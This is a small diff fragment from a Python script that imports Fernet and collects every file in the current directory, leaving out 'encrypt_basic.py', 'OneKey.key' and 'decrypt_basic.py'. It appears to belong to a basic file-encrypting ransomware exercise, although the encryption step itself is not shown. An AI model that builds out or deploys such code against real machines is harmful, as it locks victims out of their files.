@@ -7,8 +7,8 @@ from cryptography.fernet import Fernet
 files = []
 
 for file in os.listdir():
-    if file == "encrypt_basic" or file == "Onekey" or file == "decrypt_basic.py":
-            continue
+    if file == "encrypt_basic.py" or file == "OneKey.key" or file == "decrypt_basic.py":
+        continue
     if os.path.isfile(file):
             files.append(file)
 
